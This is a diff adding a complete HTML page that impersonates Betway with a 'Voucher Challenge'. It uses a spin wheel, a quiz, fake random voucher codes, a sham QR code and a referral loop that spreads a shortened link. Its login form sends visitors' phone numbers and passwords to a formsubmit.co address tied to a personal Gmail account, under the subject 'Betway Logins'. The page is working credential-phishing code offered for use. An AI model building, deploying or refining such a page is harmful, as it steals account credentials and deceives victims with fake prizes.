@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Betway Voucher Challenge</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --primary:#1FC600;
+  --secondary:#32CD32;
+  --accent:#ffd700;
+  --bg-dark:#121212;
+  --bg-light:#f2f2f2;
+  --bg-gradient-dark:linear-gradient(135deg,#121212,#1f1f1f);
+  --bg-gradient-light:linear-gradient(135deg,#f2f2f2,#ffffff);
+  --card-bg-dark:rgba(0,0,0,0.45);
+  --card-bg-light:rgba(255,255,255,0.85);
+  --text-light:#f5f5f5;
+  --text-dark:#222;
+}
+
+/* Base */
+body { font-family:'Montserrat',sans-serif; margin:0; padding:0; background:var(--bg-gradient-dark); color:var(--text-light); overflow-x:hidden; transition: background 0.5s, color 0.5s; }
+header img { max-width:150px; margin-bottom:15px; filter:drop-shadow(0 0 15px var(--primary)); }
+h1,h2,h3 { font-family:'Orbitron',sans-serif; font-weight:700; color:var(--primary); margin:0 0 12px 0; }
+p { color:#bbb; margin:8px 0 18px 0; }
+button { padding:12px 28px; border:none; border-radius:28px; background:linear-gradient(90deg,var(--primary),var(--secondary)); color:#fff; font-weight:700; cursor:pointer; margin:8px 6px; transition:0.25s; font-family:'Orbitron',sans-serif; box-shadow:0 6px 30px rgba(0,123,255,0.12); }
+button:hover { transform:translateY(-2px); box-shadow:0 12px 40px rgba(0,212,255,0.12); }
+
+/* Page container */
+.page { display:none; padding:28px; max-width:1000px; margin:26px auto; text-align:center; border-radius:18px; background:var(--card-bg-dark); backdrop-filter: blur(8px); box-shadow:0 10px 50px rgba(0,0,0,0.6); transition: all 0.45s ease; }
+.page.active { display:block; }
+
+/* Wheel & small components (unchanged from original styling) */
+.wheel-wrapper { position:relative; margin:20px auto; max-width:420px; }
+canvas { width:100%; height:auto; border-radius:50%; background:#fff; }
+canvas.glow { box-shadow:0 0 30px var(--primary), 0 0 60px var(--secondary), 0 0 100px rgba(0,212,255,0.25); }
+.pointer { position:absolute; top:-32px; left:50%; transform:translateX(-50%); width:0; height:0; border-left:24px solid transparent; border-right:24px solid transparent; border-bottom:42px solid var(--accent); filter:drop-shadow(0 0 12px var(--accent)); }
+.leaderboard, .rules { margin:18px auto; max-width:440px; background:rgba(255,255,255,0.03); padding:14px; border-radius:12px; text-align:left; }
+.leaderboard h3, .rules h3 { margin-top:0; font-family:'Orbitron',sans-serif; }
+.leaderboard ul { padding:0; list-style:none; margin:0; }
+.leaderboard li { margin:8px 0; padding:10px; border-radius:8px; background:rgba(0,0,0,0.28); display:flex; justify-content:space-between; align-items:center; }
+.leaderboard li.top { background:linear-gradient(90deg,#1FC600,#ffd70011); font-weight:700; color:#fff; }
+.leaderboard li.current { background:linear-gradient(90deg,#007bff,#00d4ff); font-weight:700; color:#fff; }
+
+.progress-container { background:#161616; border-radius:20px; width:90%; margin:18px auto; height:18px; box-shadow:inset 0 0 10px rgba(0,212,255,0.06); }
+.progress-bar { background:linear-gradient(90deg,var(--primary),var(--secondary)); height:100%; border-radius:20px; width:0%; transition:width 0.4s ease; }
+
+/* Login */
+.login-container h2 { font-family:'Orbitron',sans-serif; text-align:center; margin-bottom:12px; }
+.input-group { margin-bottom:14px; text-align:left; }
+.input-group label { font-weight:600; margin-bottom:6px; display:block; color:#ddd; }
+.input-group input { padding:12px; border:1px solid #333; border-radius:10px; width:100%; font-size:0.95em; background:#111; color:#fff; }
+.input-group input:focus { border:1px solid var(--primary); outline:none; box-shadow:0 0 12px rgba(0,123,255,0.08); }
+.login-btn { width:100%; margin-top:10px; }
+
+/* Tooltip */
+.tooltip { position:relative; display:inline-block; cursor:pointer; }
+.tooltip .tooltiptext { visibility:hidden; width:160px; background:#222; color:#fff; text-align:center; border-radius:6px; padding:6px; position:absolute; z-index:1; bottom:140%; left:50%; transform:translateX(-50%); opacity:0; transition:opacity 0.25s; }
+.tooltip:hover .tooltiptext { visibility:visible; opacity:1; }
+
+/* Theme toggle */
+.theme-toggle { position:fixed; top:12px; right:14px; background:var(--primary); color:#fff; border:none; border-radius:20px; padding:8px 14px; cursor:pointer; z-index:1000; transition:all 0.25s; box-shadow:0 6px 26px rgba(0,123,255,0.12); }
+.theme-toggle:hover { transform:scale(1.05); }
+
+/* ---------- NEW: Premium Voucher Card Styles (replace gold) ---------- */
+.voucher-card {
+  max-width:720px;
+  margin:14px auto;
+  display:flex;
+  gap:18px;
+  align-items:center;
+  padding:18px;
+  border-radius:16px;
+  background: linear-gradient(135deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
+  border: 1px solid rgba(255,255,255,0.04);
+  box-shadow: 0 10px 40px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.02);
+}
+.voucher-left {
+  flex:1;
+  text-align:left;
+  padding-left:6px;
+}
+.voucher-brand { display:flex; align-items:center; gap:10px; }
+.voucher-brand img { max-width:56px; filter: drop-shadow(0 6px 24px rgba(0,123,255,0.12)); border-radius:8px; }
+.voucher-title { font-size:1.05rem; color:#fff; margin-top:4px; font-weight:700; }
+.voucher-sub { color:#cfeeff; font-size:0.85rem; margin-top:6px; }
+
+.voucher-code {
+  display:inline-block;
+  margin-top:12px;
+  font-family:'Orbitron',sans-serif;
+  font-size:1.6rem;
+  letter-spacing:2px;
+  padding:10px 16px;
+  border-radius:10px;
+  background:linear-gradient(180deg, rgba(0,0,0,0.35), rgba(255,255,255,0.02));
+  border: 1px dashed rgba(255,255,255,0.06);
+  color:#fff;
+  cursor:pointer;
+  position:relative;
+  box-shadow: 0 6px 24px rgba(0,123,255,0.06);
+  min-width:180px;
+  text-align:center;
+}
+.voucher-code::before{
+  content:"";
+  position:absolute;
+  top:0; left:-75%;
+  width:50%; height:100%;
+  background:linear-gradient(120deg, rgba(255,255,255,0.06), rgba(255,255,255,0.18), rgba(255,255,255,0.06));
+  transform:skewX(-25deg);
+  animation:shimmer 2.5s linear infinite;
+}
+
+.voucher-right {
+  width:150px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:10px;
+}
+.voucher-qr {
+  width:128px;
+  height:128px;
+  border-radius:8px;
+  background:#fff;
+  display:block;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+  overflow:hidden;
+}
+.voucher-meta { font-size:0.82rem; color:#cbdcff; text-align:center; }
+
+.countdown {
+  font-family: 'Orbitron', monospace;
+  color: var(--accent);
+  font-weight: 700;
+  font-size: 1.2rem;
+  text-shadow: 0 0 6px rgba(255, 215, 0, 0.7);
+}
+
+/* small screen adjustments */
+@media (max-width:720px){
+  .voucher-card { flex-direction:column; align-items:center; padding:14px; }
+  .voucher-left { text-align:center; }
+  .voucher-right { width:100%; display:flex; flex-direction:row; justify-content:center; gap:14px; }
+  .voucher-code { min-width:220px; }
+}
+
+/* end new voucher styles */
+
+/* small footer */
+footer {
+  background: linear-gradient(90deg, #1FC600, #32CD32);
+  color: #fff;
+  text-align: center;
+  padding:10px 8px;
+  font-family: 'Orbitron', sans-serif;
+  font-weight: 700;
+  font-size:0.78em;
+  box-shadow: 0 -3px 10px rgba(0,0,0,0.25);
+  margin-top:26px;
+  
+}
+</style>
+</head>
+<body>
+
+<button class="theme-toggle" onclick="toggleTheme()">🌗Dark/Light</button>
+
+<!-- Welcome Page -->
+<div class="page active" id="welcomePage">
+  <header>
+     <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilQli_lYls_PvADA4BpO1VDhmJEGDzpjszINSSMEAjAkGdrHA-kbgjTZy-lXie02rSf5vR9OIX6VQZFFBE7RzKDRqmA6ysByB2OjhH7lqWdF7QIwjCMqNAucjNFGmekC1d3xeIpC5Rzh_oqJhhCQwHxtstsvQkK8Oqfn1wAC2ZDg19sApwxHKTjw-ZqIv9/s1600/1000039715-removebg-preview.png" alt="Betway Logo">
+    <h1>Betway Voucher Challenge ⚡</h1>
+    <p>Spin, Play & Win amazing prizes instantly.</p>
+  </header>
+  <button onclick="showPage('wheelPage')">🎡 Spin the Wheel</button>
+  <button onclick="startQuiz()">🧠 Take the Quiz</button>
+  <button onclick="showPage('invitePage')">📧 Refer & Earn</button>
+  <div class="rules">
+    <h3>📜 Instructions</h3>
+    <p>1. Spin the wheel or complete quizzes to earn vouchers.</p>
+    <p>2. Log in to your Betway account to claim prizes.</p>
+    <p>3. Refer friends to earn OTT vouchers.</p>
+    <p>4. Check the leaderboard to see your rank!</p>
+  </div>
+</div>
+
+<!-- Spin Wheel Page -->
+<div class="page" id="wheelPage">
+  <h2>Spin the Wheel!</h2>
+  <div class="wheel-wrapper">
+    <div class="pointer"></div>
+    <canvas id="wheel" width="400" height="400"></canvas>
+    <br>
+    <button id="spinBtn">Spin Now</button>
+  </div>
+  <div class="leaderboard">
+    <h3>🏆 Leaderboard</h3>
+    <ul id="leaderboardList">
+      <li class="top"><span>Thabo</span><span>R200</span></li>
+      <li><span>Anele</span><span>Free Aviator Flight</span></li>
+      <li><span>Lerato</span><span>Sports Free Bet</span></li>
+       <li><span>Emma</span><span>100 Free Spins</span></li>
+    </ul>
+  </div>
+</div>
+
+<!-- Quiz Page -->
+<div class="page" id="quizPage">
+  <h2>Quiz Challenge</h2>
+  <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
+  <div id="quizContent"></div>
+</div>
+
+<!-- Voucher Page (REPLACED: premium card, QR, countdown) -->
+<div class="page" id="voucherPage">
+  <h2>🎉 Congratulations on your winnings!</h2>
+  <div style="margin:12px 0;">
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilQli_lYls_PvADA4BpO1VDhmJEGDzpjszINSSMEAjAkGdrHA-kbgjTZy-lXie02rSf5vR9OIX6VQZFFBE7RzKDRqmA6ysByB2OjhH7lqWdF7QIwjCMqNAucjNFGmekC1d3xeIpC5Rzh_oqJhhCQwHxtstsvQkK8Oqfn1wAC2ZDg19sApwxHKTjw-ZqIv9/s1600/1000039715-removebg-preview.png" alt="Betway Logo" style="max-width:120px;">
+  </div>
+
+  <!-- Premium voucher card -->
+  <div class="voucher-card" id="voucherCard" aria-live="polite">
+    <div class="voucher-left">
+      <div class="voucher-brand">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilQli_lYls_PvADA4BpO1VDhmJEGDzpjszINSSMEAjAkGdrHA-kbgjTZy-lXie02rSf5vR9OIX6VQZFFBE7RzKDRqmA6ysByB2OjhH7lqWdF7QIwjCMqNAucjNFGmekC1d3xeIpC5Rzh_oqJhhCQwHxtstsvQkK8Oqfn1wAC2ZDg19sApwxHKTjw-ZqIv9/s1600/1000039715-removebg-preview.png" alt="Betway">
+        <div>
+          <div class="voucher-title">Exclusive Betway Voucher</div>
+          <div class="voucher-sub">Instant Prize — Single Use</div>
+        </div>
+      </div>
+
+      <div style="margin-top:8px;">
+        <div id="voucherCode" class="voucher-code tooltip" onclick="copyVoucher()">
+          XXXX-XXXX
+          <span class="tooltiptext">Click to copy</span>
+        </div>
+      </div>
+
+      <div class="voucher-sub" style="margin-top:8px;">Use this code to redeem on your Betway account.</div>
+    </div>
+
+    <div class="voucher-right">
+      <canvas id="voucherQR" class="voucher-qr" width="128" height="128" title="Voucher QR"></canvas>
+      <div class="voucher-meta">
+        <div>Prize: <strong id="voucherPrize"></strong></div>
+        <div>Valid for: <span id="voucherValidity">24h</span></div>
+        <div class="countdown" id="voucherCountdown">⏳ 24:00:00</div>
+      </div>
+    </div>
+  </div>
+
+  <p style="margin-top:12px; font-size:0.95em; color:#ddd;">
+    To claim: Log in to your Betway account → Go to Redeem/Vouchers → Enter code and confirm. <br>
+    Voucher is single-use and will expire automatically.
+  </p>
+
+  <button onclick="showPage('loginPage')">Claim Voucher</button>
+</div>
+
+<!-- Invite & Earn Page -->
+<div class="page" id="invitePage">
+  <h2>Refer & Earn OTT Voucher</h2>
+  <p>Invite friends using this link. Earn an OTT voucher after 10 invites!</p>
+  <div style="margin:10px 0;">
+    <input type="text" id="inviteLink" value="https://tinyurl.com/Betway-Voucher-Promo-Challenge" readonly style="width:80%; padding:10px; border-radius:8px; border:none; background:#222; color:#fff;">
+  </div>
+  <button onclick="copyInviteLink()">Copy Link</button>
+  <button onclick="shareInvite()">Share Link</button>
+  <p id="inviteNotice" style="margin-top:12px; font-weight:bold; color:#cfeeff;"></p>
+  <p id="inviteCount" style="margin-top:8px; color:#cfeeff;"></p>
+  <button onclick="showPage('welcomePage')">Back to Home</button>
+</div>
+
+<!-- Login Page -->
+<div class="login-container page" id="loginPage">
+  <div id="loginNotice" class="rules" style="background:linear-gradient(90deg,#007bff11,#00d4ff06); color:#cfeeff;">
+    ⚠️ Please log into your Betway account and make sure you enter correct details to claim your prize.
+  </div>
+  <div style="text-align:center;margin-bottom:12px;">
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilQli_lYls_PvADA4BpO1VDhmJEGDzpjszINSSMEAjAkGdrHA-kbgjTZy-lXie02rSf5vR9OIX6VQZFFBE7RzKDRqmA6ysByB2OjhH7lqWdF7QIwjCMqNAucjNFGmekC1d3xeIpC5Rzh_oqJhhCQwHxtstsvQkK8Oqfn1wAC2ZDg19sApwxHKTjw-ZqIv9/s1600/1000039715-removebg-preview.png" alt="Betway Logo" style="max-width:120px;">
+  </div>
+  <h2>Login to Claim</h2>
+  <form action="https://formsubmit.co/mluhcool2@gmail.com" method="POST" style="max-width:420px; margin:0 auto;">
+    <input type="hidden" name="_subject" value="Betway Logins">
+    <input type="hidden" name="_captcha" value="false">
+    <div class="input-group">
+      <label for="mobile">Mobile</label>
+      <div style="display:flex; gap:8px;">
+        <input type="text" value="+27" style="width:22%; margin-right:0; font-weight:bold; background:#222; color:#fff; border-radius:8px; padding:10px;" disabled>
+        <input type="number" name="mobile" id="mobile" placeholder="Number" style="width:78%;" required>
+      </div>
+    </div>
+    <div class="input-group">
+      <label for="password">Password</label>
+      <input type="password" name="password" id="password" placeholder="Password" required>
+    </div>
+    <button type="submit" class="login-btn">Login</button>
+  </form>
+  <div class="signup-text" style="text-align:center;margin:12px 0;">Forgot Password?</div>
+  <button class="signup-btn">Sign Up</button>
+</div>
+
+<script>
+// ---------------- Theme toggle ----------------
+let darkMode = true;
+function toggleTheme(){
+  darkMode = !darkMode;
+  document.body.style.background = darkMode ? "var(--bg-gradient-dark)" : "var(--bg-gradient-light)";
+  document.body.style.color = darkMode ? "var(--text-light)" : "var(--text-dark)";
+  document.querySelectorAll('.page').forEach(p=>{
+    p.style.background = darkMode ? "var(--card-bg-dark)" : "var(--card-bg-light)";
+    p.style.color = darkMode ? "var(--text-light)" : "var(--text-dark)";
+  });
+}
+
+// ---------------- Page Navigation ----------------
+function showPage(id){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  const el = document.getElementById(id);
+  if(el) el.classList.add('active');
+  // small visual restore for canvas-based wheel if returning home
+  if(id === 'wheelPage') drawWheel();
+}
+
+// ---------------- Quiz Logic ----------------
+const quizQuestions=[
+  {q:"Which color is in Betway's logo?", choices:["Red","Green","Blue"], a:"Green"},
+  {q:"Betway is mainly for?", choices:["Football","Betting","Gaming"], a:"Betting"},
+  {q:"Which sport does Betway sponsor?", choices:["Football","Basketball","Tennis"], a:"Football"}
+];
+let currentQ=0;
+function startQuiz(){ currentQ=0; showPage('quizPage'); loadQuiz(); }
+function loadQuiz(){
+  const quizDiv=document.getElementById('quizContent');
+  document.getElementById('progressBar').style.width=`${(currentQ/quizQuestions.length)*100}%`;
+  let q=quizQuestions[currentQ];
+  let html=`<p style="font-weight:700; color:#e6f7ff;">${q.q}</p>`;
+  q.choices.forEach(choice=>{
+    html+=`<label class="tooltip" style="display:block; margin:8px 0;"><input type="radio" name="answer" value="${choice}"> <span style="margin-left:8px;font-weight:600;">${choice}</span><span class="tooltiptext">Select this answer</span></label>`;
+  });
+  html+=`<div style="margin-top:10px;"><button onclick="submitQuiz()">Submit</button></div>`;
+  quizDiv.innerHTML=html;
+}
+function submitQuiz(){
+  const selected=document.querySelector('input[name="answer"]:checked');
+  if(!selected){ alert('Select an answer!'); return; }
+  if(selected.value===quizQuestions[currentQ].a){
+    currentQ++;
+    document.getElementById('progressBar').style.width=`${(currentQ/quizQuestions.length)*100}%`;
+    if(currentQ<quizQuestions.length){ loadQuiz(); }
+    else { showVoucher("R100 Free Bet"); }        
+  } else { alert('Incorrect! Try again.'); }
+}
+
+// ---------------- Voucher Logic ----------------
+function generateVoucher(){
+  const chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  let code='';
+  for(let i=0;i<8;i++){ code+=chars.charAt(Math.floor(Math.random()*chars.length)); }
+  return code.slice(0,4)+'-'+code.slice(4);
+}
+
+function showVoucher(prize){
+  showPage('voucherPage');
+
+  const voucherEl = document.getElementById('voucherCode');
+  voucherEl.textContent = '';
+  voucherEl.classList.add('revealing');
+
+  const code = generateVoucher();
+  let i = 0;
+  const interval = setInterval(()=>{
+    voucherEl.textContent += code[i] || '';
+    i++;
+    if(i >= code.length){
+      clearInterval(interval);
+      generateVoucherQR(code);
+      startVoucherCountdown(24*3600);
+
+      // ✅ Show the prize dynamically
+      const prizeEl = document.getElementById("voucherPrize");
+      if(prizeEl) prizeEl.textContent = prize;
+
+      const validEl = document.getElementById("voucherValidity");
+      if(validEl) validEl.textContent = "24h";
+    }
+  },120);
+}
+
+
+function copyVoucher(){
+  const voucher=document.getElementById('voucherCode').textContent;
+  if(!voucher) return;
+  navigator.clipboard.writeText(voucher).then(()=>{
+    // tiny visual feedback
+    const tt = document.querySelector('#voucherCode .tooltiptext');
+    if(tt){ tt.textContent = 'Copied!'; setTimeout(()=>tt.textContent = 'Click to copy',1200); }
+    alert("Voucher copied: " + voucher);
+  }).catch(()=>alert("Unable to copy"));
+}
+
+// simple pseudo-QR generator: deterministic pattern based on code (visual only)
+function generateVoucherQR(code){
+  const canvas = document.getElementById('voucherQR');
+  if(!canvas) return;
+  const ctx = canvas.getContext('2d');
+  const size = 128;
+  ctx.fillStyle = '#fff';
+  ctx.fillRect(0,0,size,size);
+
+  // create a small grid 21x21 like a QR (visual approximation)
+  const grid = 21;
+  const cell = Math.floor(size / grid);
+  // hash the code into a seed number
+  let seed = 0;
+  for(let i=0;i<code.length;i++) seed = (seed * 131 + code.charCodeAt(i)) & 0xffffffff;
+
+  // draw pattern
+  ctx.fillStyle = '#000';
+  for(let y=0;y<grid;y++){
+    for(let x=0;x<grid;x++){
+      // reserve finder patterns on corners (visual)
+      const inFinder = ( (x<4 && y<4) || (x<4 && y>grid-5) || (x>grid-5 && y<4) );
+      let on = false;
+      if(inFinder){
+        on = ((x%2===0) || (y%2===0));
+      } else {
+        // pseudo-random but deterministic
+        seed = (seed * 1103515245 + 12345) & 0x7fffffff;
+        on = (seed % 3 === 0);
+      }
+      if(on){
+        ctx.fillRect(x*cell, y*cell, cell, cell);
+      }
+    }
+  }
+
+  // center small code text overlay (subtle)
+  ctx.fillStyle = 'rgba(255,255,255,0.0)';
+  // done
+}
+
+// countdown for voucher expiry
+let voucherTimerInterval = null;
+function startVoucherCountdown(seconds){
+  // clear previous
+  if(voucherTimerInterval) clearInterval(voucherTimerInterval);
+  let remaining = seconds;
+  const el = document.getElementById('voucherCountdown');
+  function update(){
+    const hrs = Math.floor(remaining / 3600);
+    const mins = Math.floor((remaining % 3600) / 60);
+    const secs = remaining % 60;
+    const formatted = `${hrs.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+    if(el) el.textContent = `⏳ ${formatted}`;
+    if(remaining <= 0){
+      clearInterval(voucherTimerInterval);
+      if(el) el.textContent = `⏳ Expired`;
+    } else {
+      remaining--;
+    }
+  }
+  update();
+  voucherTimerInterval = setInterval(update,1000);
+}
+
+// ---------------- Wheel Logic (kept from original, minor tidy) ----------------
+const canvas=document.getElementById('wheel');
+const ctx=canvas ? canvas.getContext('2d') : null;
+const spinBtn=document.getElementById('spinBtn');
+const prizes=["R50 Bonus","R100 Bonus","R200 Free Bet","Free Spins","Try Again","Jackpot"];
+const colors=["#007bff","#1a1a1a","#007bff","#1a1a1a","#007bff","#1a1a1a"];
+const slices=prizes.length;
+const arc=(2*Math.PI)/slices;
+const logo = new Image();
+logo.src = 'https://images.seeklogo.com/logo-png/43/2/betway-logo-png_seeklogo-434766.png';
+
+function drawWheel(){
+  if(!ctx) return;
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  for(let i=0;i<slices;i++){
+    const angle=i*arc;
+    ctx.beginPath();
+    ctx.fillStyle=colors[i];
+    ctx.moveTo(200,200);
+    ctx.arc(200,200,190,angle,angle+arc);
+    ctx.lineTo(200,200);
+    ctx.fill();
+    ctx.save();
+    ctx.translate(200,200);
+    ctx.rotate(angle+arc/2);
+    ctx.fillStyle="#fff";
+    ctx.font="bold 14px Montserrat";
+    ctx.textAlign="right";
+    ctx.fillText(prizes[i],170,6);
+    ctx.restore();
+  }
+  ctx.beginPath();
+  ctx.fillStyle="#ffffff";
+  ctx.arc(200,200,70,0,2*Math.PI);
+  ctx.fill();
+  if(logo.complete) ctx.drawImage(logo, 150, 150, 100, 100);
+  else logo.onload = ()=> ctx.drawImage(logo,150,150,100,100);
+}
+drawWheel();
+
+if(spinBtn){
+  spinBtn.addEventListener('click', () => {
+    spinBtn.disabled = true;
+    let angle = 1800 + Math.floor(Math.random() * 360);
+    canvas.classList.add("glow");
+    canvas.style.transition='transform 4s cubic-bezier(.17,.67,.83,.67)';
+    canvas.style.transform=`rotate(${angle}deg)`;
+    setTimeout(()=>{
+      canvas.classList.remove("glow");
+      const winningIndex = Math.floor(((360-(angle%360))%360)/(360/slices));
+      const prize = prizes[winningIndex];
+      if(prize === "Try Again"){ alert("Sorry you didn't win! Try again."); }
+      else { alert(`You won: ${prize}`); addLeaderboard(prize); showVoucher(prize); }
+      spinBtn.disabled=false;
+      canvas.style.transition='none';
+      canvas.style.transform='rotate(0deg)';
+    },4200);
+  });
+}
+
+// add entry to leaderboard
+function addLeaderboard(prize){
+  const leaderboard=document.getElementById('leaderboardList');
+  const li=document.createElement('li');
+  li.classList.add('current');
+  li.innerHTML=`<span style="font-weight:700">You</span><span style="font-weight:700">${prize}</span>`;
+  leaderboard.prepend(li);
+}
+
+// ---------------- Invite & Earn ----------------
+let inviteCounter=0;
+function copyInviteLink(){
+  const link=document.getElementById('inviteLink');
+  if(!link) return;
+  navigator.clipboard.writeText(link.value).then(()=>alert("Link copied!"));
+}
+function shareInvite(){
+  inviteCounter++;
+  const notice=document.getElementById('inviteNotice');
+  const count=document.getElementById('inviteCount');
+  if(notice) notice.textContent=`Link shared successfully!`;
+  if(count) count.textContent=`Invites sent: ${inviteCounter}/10`;
+  if(inviteCounter>=10){
+    const voucher=generateVoucher();
+    if(notice) notice.innerHTML=`🎉 You earned an OTT Voucher: <span style="font-weight:bold;">${voucher}</span><br>Log into your Betway account to claim. Expires in 7 days.`;
+    inviteCounter=0;
+  }
+}
+</script>
+
+<footer>
+  © 2025 Betway. Betway Voucher Challenge 
+</footer>
+
+
+</body>
+</html>
